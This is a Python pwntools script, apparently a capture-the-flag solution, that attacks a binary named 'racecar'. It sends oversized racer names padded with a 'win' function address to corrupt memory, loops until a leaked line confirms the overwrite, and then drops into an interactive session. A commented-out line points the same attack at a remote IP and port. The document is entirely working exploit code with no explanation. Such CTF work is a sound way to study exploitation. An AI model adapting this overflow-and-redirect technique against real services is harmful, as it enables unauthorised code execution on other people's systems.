from pwn import *


def choose(p, n):
    p.sendlineafter(b'> ', str(n).encode())


def add(p, name):
    p.recvuntil(b'racer: ')
    p.sendline(str(name).encode())


done = 0
while(1):
    p = process('./racecar')
    # p = remote('188.166.220.129',10002)
    # gdb.attach(p,'''
    #     b *0x00004013E8
    #     c
    # ''')
            
    win = 0x00004013E0
    # gdb.attach(p, '''
    #     c
    # ''')

    for i in range(5):
        choose(p, 1)
        p.recvuntil(b'racer: ')
        p.sendline(b'A'*(0x100))

    for i in range(5):
        choose(p, 1)
        p.recvuntil(b'racer: ')
        p.sendline(b'B'*(0x28) + p64(win + 8))

    # choose(p,1)
    # p.recvuntil(b'racer: ')
    # p.sendline(p64(0x000000000040101a))



    count = 0
    while True:
        choose(p, 2)
        p.recvuntil(b'Our winner: ')
        leak = p.recvline()
        count += 1
        print(str(count) + '\t', end="")
        print(leak)
        if (len(leak) > 0x101):
            if b'AABB' in leak:
                done = 1
            # print(str(count) + '\t',end="")
            # print(leak)
            break
    
    if(done):
        break

    p.close()
           
p.interactive()